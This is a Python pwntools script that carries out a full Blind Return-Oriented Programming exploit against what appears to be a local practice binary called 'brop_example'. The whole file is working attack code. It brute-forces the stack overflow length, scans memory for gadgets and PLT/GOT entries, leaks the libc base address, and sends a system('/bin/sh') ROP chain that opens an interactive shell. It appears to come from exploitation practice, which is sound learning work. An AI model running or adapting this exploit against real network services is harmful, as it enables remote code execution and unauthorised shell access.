import pwn
import sys
import configparser


sys.path.append('../../MyTools')
import gadgets_info
import conversion

pwn.context.clear()
pwn.context.update(
	arch = 'amd64', os = 'linux',
)

target_info = {
	'exec_path': './brop_example',
	'libc_info': None,
	'conn': None,
	'config_info': None,
	'config_path': 'config.ini',
	'addr_len': 0x8,
	'crash_addr': 0x0,
	'stack_overflow_len': 0x0,
	'read_mode_enter_addr': 0x0,
	'csu_gadget_addr': 0x0,
	'csu_pop_rdi_offset': 0x9,
	'csu_pop_regs_count': 0x6,
	'plt4puts_addr': 0x0,
	'puts_target_addr': 0x400000,
	'puts_tagert_signature_code': b'\x7fELF',
	'gotplt4puts_addr_leak': 0x0,
	'plt_instructions_code_index': 0x0,
	'push_rela_index2jmp_gotplt_offset': 0x6,
	'jmp_plt2jmp_gotplt_offset': 0xb,
	'plt_instructions_code_info': [
		b'\xff\x25',		# jmp got.plt
		b'\x68',			# push relocation index
		b'\xe9',			# jmp .plt
	],
}

def config_parse_failed_handle(msg):
	print('[--] parse config [{0}] failed'.format(target_info['config_path']))
	if msg != None:
		print('[--] {0}'.format(msg))
	exit(-1)

def config_info_init():
	try:
		target_info['config_info'] = configparser.ConfigParser()
		target_info['config_info'].read(target_info['config_path'])
	except Exception:
		config_parse_failed_handle(None)

def config_field_get(tag_name, field_name):
	try:
		val = target_info['config_info'][tag_name][field_name]
		return val
	except Exception:
		config_parse_failed_handle('get [{0}] - [{1}]'.format(tag_name, field_name))
		return -1

def config_field_set(tag_name, field_name, value):
	try:
		target_info['config_info'][tag_name][field_name] = str(value)
		with open(target_info['config_path'], 'w') as cfg_file:
			target_info['config_info'].write(cfg_file)
	except Exception:
		config_parse_failed_handle('set [{0}] - [{1}]'.format(tag_name, field_name))

def connect_start():
	try:
		target_info['conn'] = pwn.remote('127.0.0.1', 9527)
		data = target_info['conn'].recvuntil(b'hello brop!\n')
	except Exception:
		print('[--] cannot start connect')
		exit(-1)

def connect_stop():
	try:
		target_info['conn'].close()
		target_info['conn'] = None
	except Exception:
		print('[--] cannot close connect')
		exit(-1)

def stack_overflow_len_get():
	_len = int(config_field_get('stack_info', 'stack_overflow_length'))
	print('[--] current stack overflow length = {0}'.format(_len))
	if _len <= 0:
		_len = 1

	while True:
		try:
			connect_start()
			print(_len)

			payload = b'A' * _len
			target_info['conn'].send(payload)
			target_info['conn'].recv()
			connect_stop()

			_len += 1
		except Exception:
			connect_stop()
			_len -= 1

			config_field_set('stack_info', 'stack_overflow_length', _len)
			print('[++] available stack overflow length = {0}'.format(_len))
			return _len

def crash_addr_check(addr, is_crash, payload, leak_data):
	if is_crash == True:
		config_field_set('bind_rop_info', 'crash_addr', hex(addr))
		return addr
	return None

def read_mode_addr_check(addr, is_crash, payload, leak_data):
	try:
		ret = None
		has_crash = False
		if is_crash == True:
			return ret

		test_payload = b'B' * target_info['stack_overflow_len']
		if target_info['read_mode_enter_addr'] != 0x0:
			test_payload += pwn.p64(target_info['read_mode_enter_addr'])
		else:
			test_payload += pwn.p64(addr)
		target_info['conn'].send(test_payload)
		target_info['conn'].recv(timeout = 5)
		target_info['conn'].send(test_payload)
		target_info['conn'].recv(timeout = 5)
	except Exception:
		print('[--] receive Exception')
		has_crash = True
	if has_crash == False:
		ret = addr
	return ret

def csu_gadget_addr_check(addr, is_crash, payload, leak_data):
	ret = read_mode_addr_check(addr, is_crash, payload, leak_data)
	if ret != None:
		try:
			ret = None
			test_payload = payload
			test_payload += pwn.p64(0x0) * target_info['csu_pop_regs_count']
			test_payload += pwn.p64(target_info['crash_addr'])
			target_info['conn'].send(test_payload)
			target_info['conn'].recv(timeout = 5)
		except Exception:
			ret = addr
	return ret

def plt4puts_addr_check(addr, is_crash, payload, leak_data):
	if is_crash == False:
		print(leak_data)
		if leak_data.startswith(target_info['puts_tagert_signature_code']):
			return addr
	return None

def leak_libc_by_gotplt_store_addr_check(addr, is_crash, payload, leak_data):
	global pre_addr
	global leak_info
	if pre_addr != 0x0:
		if (addr - pre_addr) > 0x8:
			target_info['plt_instructions_code_index'] = 0x0
	if leak_data.startswith(target_info['plt_instructions_code_info'][target_info['plt_instructions_code_index']]):
		if target_info['plt_instructions_code_index'] == 0x0:
			leak_info = leak_data
		if target_info['plt_instructions_code_index'] == 0x2:
			plt_starting_addr = addr - target_info['jmp_plt2jmp_gotplt_offset']
			print('[--] [{0}] was plt starting address'.format(hex(plt_starting_addr)))
			return plt_starting_addr
		target_info['plt_instructions_code_index'] += 1
		pre_addr = addr
	return None

def addr_traversal(cfg_tag_name, cfg_field_name, check_rule, rop_fix, payload_fix):
	addr = int(config_field_get(cfg_tag_name, cfg_field_name), 16)
	if addr <= 0:
		addr = int(config_field_get('bind_rop_info', 'base_addr'), 16)
	print('[--] current address = {0}'.format(hex(addr)))
	leak_data = b''

	while True:
		try:
			has_crash = False
			connect_start()

			print('[--] try address = {0}'.format(hex(addr)))
			pre_payload = b'A' * target_info['stack_overflow_len']
			if rop_fix != None:
				pre_payload += rop_fix
			pre_payload += pwn.p64(addr)
			payload = pre_payload
			if payload_fix != None:
				payload = pre_payload + payload_fix
			target_info['conn'].send(payload)
			leak_data = target_info['conn'].recv(timeout = 5)
		except Exception:
			print('[--] receive exception')
			has_crash = True

		ret = check_rule(addr, has_crash, pre_payload, leak_data)
		connect_stop()
		if ret != None:
			print('[--] available {0} address = {1}'.format(cfg_field_name, hex(ret)))
			config_field_set(cfg_tag_name, cfg_field_name, hex(ret))
			return ret
		addr += 1

pwn.context.binary = pwn.ELF(target_info['exec_path'])
target_info['libc_info'] = pwn.ELF(target_info['exec_path']).libc

config_info_init()

target_info['stack_overflow_len'] = stack_overflow_len_get()
target_info['crash_addr'] = addr_traversal(
	'bind_rop_info', 'crash_addr',
	crash_addr_check, None, None
)
target_info['read_mode_enter_addr'] = addr_traversal(
	'bind_rop_info', 'read_mode_addr',
	read_mode_addr_check, None, None
)

brop_csu_find_payload_fix = pwn.p64(0x0) * target_info['csu_pop_regs_count']
brop_csu_find_payload_fix += pwn.p64(target_info['read_mode_enter_addr'])
target_info['csu_gadget_addr'] = addr_traversal(
	'bind_rop_info', 'csu_gadget_addr',
	csu_gadget_addr_check, None,
	brop_csu_find_payload_fix
)

pop_rdi_offset = target_info['csu_gadget_addr'] + target_info['csu_pop_rdi_offset']
plt4puts_find_rop_fix = pwn.p64(pop_rdi_offset)
plt4puts_find_rop_fix += pwn.p64(target_info['puts_target_addr'])
plt4puts_find_payload_fix = pwn.p64(target_info['read_mode_enter_addr'])
target_info['plt4puts_addr'] = addr_traversal(
	'bind_rop_info', 'plt4puts_addr',
	plt4puts_addr_check, plt4puts_find_rop_fix,
	plt4puts_find_payload_fix
)

gotplt4puts_find_rop_fix =  pwn.p64(pop_rdi_offset)
gotplt4puts_find_payload_fix = pwn.p64(target_info['plt4puts_addr'])
gotplt4puts_find_payload_fix += pwn.p64(target_info['read_mode_enter_addr'])
target_info['plt_instructions_code_index'] = 0x0
pre_addr = 0x0
leak_info = None
target_info['gotplt4puts_addr_leak'] = addr_traversal(
	'bind_rop_info', 'gotplt4puts_addr',
	leak_libc_by_gotplt_store_addr_check, gotplt4puts_find_rop_fix,
	gotplt4puts_find_payload_fix
)

offset = conversion.bytes2int(leak_info[2:4])
target_info['gotplt4puts_addr_leak'] += target_info['push_rela_index2jmp_gotplt_offset'] + offset

connect_start()
payload = b'C' * target_info['stack_overflow_len']
payload += pwn.p64(pop_rdi_offset)
payload += pwn.p64(target_info['gotplt4puts_addr_leak'])
payload += pwn.p64(target_info['plt4puts_addr'])
payload += pwn.p64(target_info['read_mode_enter_addr'])

target_info['conn'].send(payload)
data = target_info['conn'].recv(timeout = 5)
libc_puts_addr = conversion.bytes2int(data[:6])
libc_base = libc_puts_addr - 0x77980
print('[**] libc base address = {0}'.format(hex(libc_base)))

libc_system_addr = libc_base + target_info['libc_info'].symbols['system']
libc_binsh_addr = libc_base + target_info['libc_info'].search(b'/bin/sh').__next__()
payload = b'A' * target_info['stack_overflow_len']
payload += pwn.p64(pop_rdi_offset)
payload += pwn.p64(libc_binsh_addr)
payload += pwn.p64(pop_rdi_offset + 1)
payload += pwn.p64(libc_system_addr)
payload += pwn.p64(target_info['read_mode_enter_addr'])
target_info['conn'].sendline(payload)

target_info['conn'].interactive()
